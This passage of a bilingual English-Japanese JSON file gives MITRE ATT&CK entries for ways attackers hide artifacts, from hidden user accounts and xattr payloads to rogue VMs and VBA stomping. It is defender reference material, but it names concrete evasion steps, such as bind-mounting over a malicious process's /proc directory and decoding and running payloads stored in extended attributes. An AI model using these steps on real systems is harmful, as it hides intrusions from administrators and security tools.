distributions and may be changed by a user or adversary.",
                        "description_jp": "攻撃者は、作成または変更したユーザーアカウントの存在を隠すために隠しユーザーを使用する可能性があります。管理者は、特定のシステムに多数のユーザーアカウントがある場合や、他のユーザーから管理者アカウントやその他の管理アカウントを隠したい場合に、ユーザーを非表示にすることを望む場合があります。\n\nmacOSでは、攻撃者はplistファイル、フォルダ属性、およびユーザー属性を操作することにより、ユーザーを作成または変更して非表示にすることができます。ユーザーがログイン画面やシステム環境設定に表示されないようにするために、攻撃者はユーザーIDを500未満に設定し、<code>/Library/Preferences/com.apple.loginwindow</code> plistファイルのキー値<code>Hide500Users</code>を<code>TRUE</code>に設定できます。(引用: Cybereason OSX Pirrit) すべてのユーザーにはユーザーIDが関連付けられています。<code>Hide500Users</code>キー値が<code>TRUE</code>に設定されている場合、ユーザーIDが500未満のユーザーはログイン画面やシステム環境設定に表示されません。コマンドラインを使用して、攻撃者は<code>dscl</code>ユーティリティを使用して<code>IsHidden</code>属性を<code>1</code>に設定することにより、非表示のユーザーアカウントを作成できます。攻撃者はまた、<code>chflags</code>を非表示に変更することにより、ユーザーのホームフォルダを非表示にすることもできます。(引用: Apple Support Hide a User Account)\n\n攻撃者は同様にWindowsでユーザーアカウントを非表示にする可能性があります。攻撃者は、特定のユーザーに対して<code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code>レジストリキーの値を<code>0</code>に設定して、そのユーザーがログオン画面に表示されないようにすることができます。(引用: FireEye SMOKEDHAM June 2021)(引用: US-CERT TA18-074A)\n\nLinuxシステムでは、攻撃者はログイン画面（グリーターとも呼ばれる）からユーザーアカウントを非表示にする可能性があります。攻撃者が使用する方法は、ディストリビューションが現在使用しているディスプレイマネージャーによって異なります。例えば、GNOMEディスプレイマネージャー（GDM）を使用しているUbuntuシステムでは、<code>gsettings</code>コマンドを使用してグリーターからアカウントを非表示にすることができます（例：<code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>）。(引用: Hide GDM User Accounts) ディスプレイマネージャーは特定のディストリビューションに固定されておらず、ユーザーまたは攻撃者によって変更される可能性があります。"
                    },
                    {
                        "id": "T1564.012",
                        "name_eng": "File/Path Exclusions",
                        "name_jp": "ファイル/パスの除外",
                        "description_eng": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.",
                        "description_jp": "攻撃者は、ウイルス対策（AV）スキャンやその他の防御機能から除外された特定のフォルダやファイル名にファイルベースのアーティファクトを書き込むことで、それらを隠そうとする可能性があります。AVやその他のファイルベースのスキャナには、パフォーマンスを最適化し、アプリケーションのインストールと正当な使用を容易にするための除外が含まれていることがよくあります。これらの除外は状況に応じたものである場合もありますが（例えば、特定の発動イベント/アラートに応じてスキャンが開始されるなど）、信頼できる正当なものと見なされる特定のフォルダやファイルを参照するハードコードされた文字列であることもよくあります。(引用: Microsoft File Folder Exclusions)\n\n攻撃者はこれらの除外を悪用して、ファイルベースのアーティファクトを隠す可能性があります。例えば、新しい除外を追加するためにツール設定を改ざんする（つまり、[ツールの無効化または変更](https://attack.mitre.org/techniques/T1562/001)）のではなく、攻撃者はデフォルトまたはその他のよく知られた除外にファイルベースのペイロードをドロップする可能性があります。攻撃者はまた、[セキュリティソフトウェアの発見](https://attack.mitre.org/techniques/T1518/001)やその他の[発見](https://attack.mitre.org/tactics/TA0007)/[偵察](https://attack.mitre.org/tactics/TA0043)活動を利用して、被害者環境内の既存の除外を発見および検証する可能性があります。"
                    },
                    {
                        "id": "T1564.014",
                        "name_eng": "Extended Attributes",
                        "name_jp": "拡張属性",
                        "description_eng": "Adversaries may abuse extended attributes (xattrs) on macOS and Linux to hide their malicious data in order to evade detection. Extended attributes are key-value pairs of file and directory metadata used by both macOS and Linux. They are not visible through standard tools like `Finder`,  `ls`, or `cat` and require utilities such as `xattr` (macOS) or `getfattr` (Linux) for inspection. Operating systems and applications use xattrs for tagging, integrity checks, and access control. On Linux, xattrs are organized into namespaces such as `user.` (user permissions), `trusted.` (root permissions), `security.`, and `system.`, each with specific permissions. On macOS, xattrs are flat strings without namespace prefixes, commonly prefixed with `com.apple.*` (e.g., `com.apple.quarantine`, `com.apple.metadata:_kMDItemUserTags`) and used by system features like Gatekeeper and Spotlight.(Citation: Establishing persistence using extended attributes on Linux)\n\nAn adversary may leverage xattrs by embedding a second-stage payload into the extended attribute of a legitimate file. On macOS, a payload can be embedded into a custom attribute using the `xattr` command. A separate loader can retrieve the attribute with `xattr -p`, decode the content, and execute it using a scripting interpreter. On Linux, an adversary may use `setfattr` to write a payload into the `user.` namespace of a legitimate file. A loader script can later extract the payload with `getfattr --only-values`, decode it, and execute it using bash or another interpreter. In both cases, because the primary file content remains unchanged, security tools and integrity checks that do not inspect extended attributes will observe the original file hash, allowing the malicious payload to evade detection.(Citation: Low GroupIB xattrs nov 2024)",
                        "description_jp": "攻撃者は、macOSおよびLinuxの拡張属性（xattrs）を悪用して、検出を回避するために悪意のあるデータを隠す可能性があります。拡張属性は、macOSとLinuxの両方で使用されるファイルおよびディレクトリメタデータのキーと値のペアです。これらは`Finder`、`ls`、`cat`などの標準ツールでは表示されず、検査には`xattr`（macOS）や`getfattr`（Linux）などのユーティリティが必要です。オペレーティングシステムとアプリケーションは、タグ付け、整合性チェック、およびアクセス制御にxattrsを使用します。Linuxでは、xattrsは`user.`（ユーザー権限）、`trusted.`（ルート権限）、`security.`、および`system.`などの名前空間に編成され、それぞれに特定の権限があります。macOSでは、xattrsは名前空間プレフィックスのないフラットな文字列であり、一般的に`com.apple.*`（例：`com.apple.quarantine`、`com.apple.metadata:_kMDItemUserTags`）で始まり、GatekeeperやSpotlightなどのシステム機能で使用されます。(引用: Establishing persistence using extended attributes on Linux)\n\n攻撃者は、正当なファイルの拡張属性にセカンドステージペイロードを埋め込むことにより、xattrsを利用する可能性があります。macOSでは、`xattr`コマンドを使用してペイロードをカスタム属性に埋め込むことができます。別のローダーが`xattr -p`で属性を取得し、コンテンツをデコードして、スクリプトインタプリタを使用して実行できます。Linuxでは、攻撃者は`setfattr`を使用して、正当なファイルの`user.`名前空間にペイロードを書き込む可能性があります。ローダースクリプトは、後で`getfattr --only-values`でペイロードを抽出し、デコードして、bashまたは別のインタプリタを使用して実行できます。どちらの場合も、プライマリファイルコンテンツは変更されないため、拡張属性を検査しないセキュリティツールと整合性チェックは元のファイルハッシュを監視し、悪意のあるペイロードが検出を回避できるようにします。(引用: Low GroupIB xattrs nov 2024)"
                    },
                    {
                        "id": "T1564.008",
                        "name_eng": "Email Hiding Rules",
                        "name_jp": "メール隠蔽ルール",
                        "description_eng": "Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)\n\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.\n\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)\n\nIn some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",
                        "description_jp": "攻撃者はメールルールを使用して、侵害されたユーザーのメールボックス内の受信メールを隠す可能性があります。多くのメールクライアントでは、ユーザーはメールを他のフォルダに移動したり、メールを既読にしたり、メールを削除したりするなど、さまざまなメール機能の受信トレイ ルールを作成できます。ルールは、メールクライアント内または、Windowsシステムの<code>New-InboxRule</code>や<code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001)コマンドレットなどの外部機能を介して作成または変更できます。(引用: Microsoft Inbox Rules)(引用: MacOS Email Rules)(引用: Microsoft New-InboxRule)(引用: Microsoft Set-InboxRule)\n\n攻撃者は、侵害されたユーザーのメールボックス内のメールルールを利用して、メールを削除したり、目立たないフォルダに移動したりする可能性があります。攻撃者はこれを利用して、セキュリティアラート、C2通信、または侵害されたアカウントから送信された[内部スピアフィッシング](https://attack.mitre.org/techniques/T1534)メールへの応答を隠す可能性があります。\n\n組織内の任意のユーザーまたは管理者（または有効な資格情報を持つ攻撃者）は、メールを自動的に移動または削除するルールを作成できる可能性があります。これらのルールは、メールの内容がユーザーまたは防御側によってすぐに確認された場合に検出を妨害/遅延させるために悪用される可能性があります。悪意のあるルールは通常、メッセージ本文や件名に含まれるキーワード（<code>malware</code>、<code>suspicious</code>、<code>phish</code>、<code>hack</code>など）に基づいてメールをフィルタリングします。(引用: Microsoft Cloud App Security)\n\n一部の環境では、管理者は個々の受信トレイではなく組織全体で動作するメールルールを有効にできる場合があります。例えば、Microsoft Exchangeは、組織が受信するすべてのメールをユーザー指定の条件に対して評価し、それらの条件に準拠するメールに対してユーザー指定のアクションを実行するトランスポートルールをサポートしています。(引用: Microsoft Mail Flow Rules 2023) このような機能を悪用する攻撃者は、特定のトピック（内部セキュリティインシデント通知など）に関連するすべてのメールを自動的に変更または削除できる可能性があります。"
                    },
                    {
                        "id": "T1564.009",
                        "name_eng": "Resource Forking",
                        "name_jp": "リソースフォーキング",
                        "description_eng": "Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.(Citation: macOS Hierarchical File System Overview) Usage of a resource fork is identifiable when displaying a file’s extended attributes, using <code>ls -l@</code> or <code>xattr -l</code> commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the <code>/Resources</code> folder.(Citation: Resource and Data Forks)(Citation: ELC Extended Attributes)\n\nAdversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.(Citation: sentinellabs resource named fork 2020)(Citation: tau bundlore erika noerenberg 2020)",
                        "description_jp": "攻撃者はリソースフォークを悪用して、検出を回避しセキュリティアプリケーションをバイパスするために、悪意のあるコードや実行可能ファイルを隠す可能性があります。リソースフォークは、アプリケーションがサムネイル画像、メニュー定義、アイコン、ダイアログボックス、コードなどのリソースを構造化された方法で保存する方法を提供します。(引用: macOS Hierarchical File System Overview) リソースフォークの使用は、<code>ls -l@</code>または<code>xattr -l</code>コマンドを使用してファイルの拡張属性を表示するときに識別できます。リソースフォークは非推奨となり、アプリケーションバンドル構造に置き換えられました。ローカライズされていないリソースはアプリケーションバンドルのトップレベルディレクトリに配置され、ローカライズされたリソースは<code>/Resources</code>フォルダに配置されます。(引用: Resource and Data Forks)(引用: ELC Extended Attributes)\n\n攻撃者はリソースフォークを使用して、他の方法ではファイルに直接保存される可能性のある悪意のあるデータを隠すことができます。攻撃者は、実行可能な場所に移動されてから呼び出される、指定されたオフセットでリソースフォークがアタッチされたコンテンツを実行できます。リソースフォークのコンテンツは、実行されるまで難読化/暗号化されることもあります。(引用: sentinellabs resource named fork 2020)(引用: tau bundlore erika noerenberg 2020)"
                    },
                    {
                        "id": "T1564.013",
                        "name_eng": "Bind Mounts",
                        "name_jp": "バインドマウント",
                        "description_eng": "Adversaries may abuse bind mounts on file structures to hide their activity and artifacts from native utilities. A bind mount maps a directory or file from one location on the filesystem to another, similar to a shortcut on Windows. It’s commonly used to provide access to specific files or directories across different environments, such as inside containers or chroot environments, and requires sudo access. \n\nAdversaries may use bind mounts to map either an empty directory or a benign `/proc` directory to a malicious process’s `/proc` directory. Using the commands `mount –o bind /proc/benign-process /proc/malicious-process` (or `mount –B`), the malicious process's `/proc` directory is overlayed with the contents of a benign process's `/proc` directory. When system utilities query process activity, such as `ps` and `top`, the kernel follows the bind mount and presents the benign directory’s contents instead of the malicious process's actual `/proc` directory. As a result, these utilities display information that appears to come from the benign process, effectively hiding the malicious process's metadata, executable, or other artifacts from detection.(Citation: Cado Security Commando Cat 2024)(Citation: Ahn Lab CoinMiner 2023)",
                        "description_jp": "攻撃者は、ファイル構造上のバインドマウントを悪用して、ネイティブユーティリティからアクティビティやアーティファクトを隠す可能性があります。バインドマウントは、Windowsのショートカットと同様に、ファイルシステム上のある場所から別の場所へディレクトリまたはファイルをマッピングします。これは、コンテナ内やchroot環境など、さまざまな環境間で特定のファイルやディレクトリへのアクセスを提供するために一般的に使用され、sudoアクセスが必要です。\n\n攻撃者は、バインドマウントを使用して、空のディレクトリまたは良性の`/proc`ディレクトリを悪意のあるプロセスの`/proc`ディレクトリにマッピングする可能性があります。コマンド`mount –o bind /proc/benign-process /proc/malicious-process`（または`mount –B`）を使用すると、悪意のあるプロセスの`/proc`ディレクトリが良性のプロセスの`/proc`ディレクトリの内容で上書きされます。`ps`や`top`などのシステムユーティリティがプロセスアクティビティを照会すると、カーネルはバインドマウントをたどり、悪意のあるプロセスの実際の`/proc`ディレクトリの代わりに良性のディレクトリの内容を提示します。その結果、これらのユーティリティは良性のプロセスから来たように見える情報を表示し、悪意のあるプロセスのメタデータ、実行可能ファイル、またはその他のアーティファクトを効果的に検出から隠します。(引用: Cado Security Commando Cat 2024)(引用: Ahn Lab CoinMiner 2023)"
                    },
                    {
                        "id": "T1564.006",
                        "name_eng": "Run Virtual Instance",
                        "name_jp": "仮想インスタンスの実行",
                        "description_eng": "Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance.(Citation: CyberCX Akira Ransomware) Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019)\n\nAdversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.(Citation: Sophos Ragnar May 2020)\n\nIn VMWare environments, adversaries may leverage the vCenter console to create new virtual machines. However, they may also create virtual machines directly on ESXi servers by running a valid `.vmx` file with the `/bin/vmx` utility. Adding this command to `/etc/rc.local.d/local.sh` (i.e., [RC Scripts](https://attack.mitre.org/techniques/T1037/004)) will cause the VM to persistently restart.(Citation: vNinja Rogue VMs 2024) Creating a VM this way prevents it from appearing in the vCenter console or in the output to the `vim-cmd vmsvc/getallvms` command on the ESXi server, thereby hiding it from typical administrative activities.(Citation: MITRE VMware Abuse 2024)",
                        "description_jp": "攻撃者は、検出を回避するために仮想インスタンスを使用して悪意のある操作を実行する可能性があります。コンピュータまたはコンピューティング環境のエミュレーションを可能にするさまざまな仮想化テクノロジが存在します。仮想インスタンス内で悪意のあるコードを実行することにより、攻撃者は仮想インスタンス内のアクティビティを監視できないセキュリティツールから、その行動に関連するアーティファクトを隠すことができます。(引用: CyberCX Akira Ransomware) さらに、仮想ネットワークの実装（ブリッジアダプターなど）によっては、IPアドレスとホスト名が既知の値と一致しない可能性があるため、仮想インスタンスによって生成されたネットワークトラフィックを侵害されたホストに追跡することが困難になる場合があります。(引用: SingHealth Breach Jan 2019)\n\n攻撃者は、仮想化のネイティブサポート（Hyper-Vなど）を利用したり、仮想インスタンスの実行に必要なファイル（VirtualBoxバイナリなど）をドロップしたりする可能性があります。仮想インスタンスを実行した後、攻撃者はゲストとホストの間に共有フォルダを作成し、仮想インスタンスがホストファイルシステムと対話できるようにする権限を付与する可能性があります。(引用: Sophos Ragnar May 2020)\n\nVMWare環境では、攻撃者はvCenterコンソールを利用して新しい仮想マシンを作成する可能性があります。ただし、`/bin/vmx`ユーティリティで有効な`.vmx`ファイルを実行することにより、ESXiサーバー上で直接仮想マシンを作成することもできます。このコマンドを`/etc/rc.local.d/local.sh`（つまり、[RCスクリプト](https://attack.mitre.org/techniques/T1037/004)）に追加すると、VMが永続的に再起動します。(引用: vNinja Rogue VMs 2024) このようにVMを作成すると、vCenterコンソールやESXiサーバー上の`vim-cmd vmsvc/getallvms`コマンドの出力に表示されなくなるため、通常の管理アクティビティから隠されます。(引用: MITRE VMware Abuse 2024)"
                    },
                    {
                        "id": "T1564.010",
                        "name_eng": "Process Argument Spoofing",
                        "name_jp": "プロセス引数の偽装",
                        "description_eng": "Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.(Citation: Microsoft PEB 2021)(Citation: Xpn Argue Like Cobalt 2019)\n\nAdversaries may manipulate a process PEB to evade defenses. For example, [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue Like Cobalt 2019)(Citation: Nviso Spoof Command Line 2020)\n\nAdversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.(Citation: FireEye FiveHands April 2021)\n\nThis behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) to manipulate or further evade process-based detections.",
                        "description_jp": "攻撃者は、プロセスのメモリを上書きすることにより、プロセスのコマンドライン引数を隠そうとする可能性があります。プロセスのコマンドライン引数は、プロセス環境ブロック（PEB）に格納されます。PEBは、Windowsがプロセスに関するさまざまな情報やプロセスが使用する情報を格納するために使用するデータ構造です。PEBには、プロセスの実行時に参照されるプロセスのコマンドライン引数が含まれています。プロセスが作成されると、プロセス作成を監視する防御ツール/センサーがPEBからプロセス引数を取得する場合があります。(引用: Microsoft PEB 2021)(引用: Xpn Argue Like Cobalt 2019)\n\n攻撃者は、防御を回避するためにプロセスのPEBを操作する可能性があります。例えば、[プロセスハロウイング](https://attack.mitre.org/techniques/T1055/012)を悪用して、良性の引数でプロセスを中断状態で起動できます。プロセスが起動されPEBが初期化された後（そしてプロセス情報がツール/センサーによって潜在的にログに記録された後）、攻撃者はPEBを上書きしてコマンドライン引数を変更し（例：[ネイティブAPI](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code>関数を使用）、その後悪意のある引数でプロセスの実行を再開する可能性があります。(引用: Cobalt Strike Arguments 2019)(引用: Xpn Argue Like Cobalt 2019)(引用: Nviso Spoof Command Line 2020)\n\n攻撃者はまた、悪意のあるコマンドライン引数でプロセスを実行し、その後、後続のプロセスメモリ分析をバイパスする可能性のある良性の引数でメモリにパッチを適用する可能性もあります。(引用: FireEye FiveHands April 2021)\n\nこの動作は、プロセスベースの検出を操作したりさらに回避したりするために、他のトリック（[親PIDスプーフィング](https://attack.mitre.org/techniques/T1134/004)など）と組み合わせることもできます。"
                    },
                    {
                        "id": "T1564.001",
                        "name_eng": "Hidden Files and Directories",
                        "name_jp": "隠しファイルとディレクトリ",
                        "description_eng": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
                        "description_jp": "攻撃者は、検出メカニズムを回避するためにファイルやディレクトリを非表示に設定する可能性があります。通常のユーザーがシステム上の特別なファイルを誤って変更するのを防ぐために、ほとんどのオペレーティングシステムには「隠し」ファイルの概念があります。これらのファイルは、ユーザーがGUIでファイルシステムを参照したり、コマンドラインで通常のコマンドを使用したりしても表示されません。ユーザーは、一連のグラフィカルユーザーインターフェイス（GUI）プロンプトを介するか、コマンドラインスイッチ（Windowsの場合は<code>dir /a</code>、LinuxおよびmacOSの場合は<code>ls –a</code>）を使用して、隠しファイルを表示するように明示的に要求する必要があります。\n\nLinuxおよびMacでは、ユーザーはファイルまたはフォルダ名の最初の文字として「.」を置くだけで、特定のファイルを非表示としてマークできます。(引用: Sofacy Komplex Trojan)(引用: Antiquated Mac Malware) ピリオド「.」で始まるファイルおよびフォルダは、デフォルトではFinderアプリケーションおよび「ls」などの標準コマンドラインユーティリティでの表示から隠されています。ユーザーは、これらのファイルを表示可能にするために設定を具体的に変更する必要があります。\n\nmacOS上のファイルは、Finder.appでの表示を防ぐUF_HIDDENフラグでマークすることもできますが、Terminal.appでの表示は引き続き可能です。(引用: WireLurker) Windowsでは、ユーザーはattrib.exeバイナリを使用して特定のファイルを非表示としてマークできます。多くのアプリケーションは、ユーザーのワークスペースを乱雑にしないように情報を保存するために、これらの隠しファイルやフォルダを作成します。たとえば、SSHユーティリティは、ユーザーの既知のホストとキーを含む非表示の.sshフォルダを作成します。\n\n攻撃者はこれを利用して、システム上のどこにでもファイルやフォルダを隠し、隠しファイルの調査を組み込んでいない一般的なユーザーまたはシステム分析を回避できます。"
                    },
                    {
                        "id": "T1564.004",
                        "name_eng": "NTFS File Attributes",
                        "name_jp": "NTFSファイル属性",
                        "description_eng": "Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)\n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)",
                        "description_jp": "攻撃者は、検出を回避するためにNTFSファイル属性を使用して悪意のあるデータを隠す可能性があります。すべての新しいテクノロジファイルシステム（NTFS）でフォーマットされたパーティションには、パーティション上のすべてのファイル/ディレクトリのレコードを保持するマスターファイルテーブル（MFT）が含まれています。(引用: SpectorOps Host-Based Jul 2017) MFTエントリ内には、拡張属性（EA）やデータ[複数のデータ属性が存在する場合は代替データストリーム（ADS）として知られる]などのファイル属性があり、これらは任意のデータ（完全なファイルさえも）を格納するために使用できます。(引用: SpectorOps Host-Based Jul 2017)(引用: Microsoft File Streams)(引用: MalwareBytes ADS July 2015)(引用: Microsoft ADS Mar 2014)\n\n攻撃者は、ファイルに直接ではなくファイル属性メタデータに悪意のあるデータやバイナリを保存する可能性があります。これは、静的インジケータスキャンツールやウイルス対策などの一部の防御を回避するために行われる可能性があります。(引用: Journey into IR ZeroAccess NTFS EA)(引用: MalwareBytes ADS July 2015)"
                    },
                    {
                        "id": "T1564.007",
                        "name_eng": "VBA Stomping",
                        "name_jp": "VBAストンピング",
                        "description_eng": "Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.(Citation: FireEye VBA stomp Feb 2020)\n\nMS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.(Citation: Evil Clippy May 2019)(Citation: Microsoft _VBA_PROJECT Stream)\n\nAn adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation: FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev)",
                        "description_jp": "攻撃者は、MS Officeドキュメントに埋め込まれた悪意のあるVisual Basic for Applications（VBA）ペイロードを、VBAソースコードを良性のデータに置き換えることによって隠す可能性があります。(引用: FireEye VBA stomp Feb 2020)\n\nVBAコンテンツが埋め込まれたMS Officeドキュメントは、モジュールストリーム内にソースコードを格納します。各モジュールストリームには、p-codeとして知られるVBAソースコードの個別のコンパイル済みバージョンを格納する<code>PerformanceCache</code>があります。p-codeは、VBAプロジェクトのバージョン依存の説明を含む<code>_VBA_PROJECT</code>ストリームで指定されたMS OfficeバージョンがホストMS Officeアプリケーションのバージョンと一致する場合に実行されます。(引用: Evil Clippy May 2019)(引用: Microsoft _VBA_PROJECT Stream)\n\n攻撃者は、VBAソースコードの場所をゼロ、良性のコード、またはランダムなバイトで上書きし、以前にコンパイルされた悪意のあるp-codeを残すことにより、悪意のあるVBAコードを隠す可能性があります。悪意のあるVBAソースコードをスキャンするツールは、不要なコードがコンパイル済みのp-codeに隠されているため、バイパスされる可能性があります。VBAソースコードが削除された場合、一部のツールはマクロが存在しないと判断することさえあります。<code>_VBA_PROJECT</code>ストリームとホストMS Officeアプリケーションの間にバージョンの一致がある場合、p-codeが実行されます。そうでない場合は、良性のVBAソースコードが解凍されてp-codeに再コンパイルされ、悪意のあるp-codeが削除され、動的分析がバイパスされる可能性があります。(引用: Walmart Roberts Oct 2018)(引用: FireEye VBA stomp Feb 2020)(引用: pcodedmp Bontchev)"
                    },
                    {
                        "id": "T1564.005",
                        "name_eng": "Hidden File System",
                        "name_jp": "隠しファイルシステム",
                        "description_eng": "Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)\n\nAdversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA)",
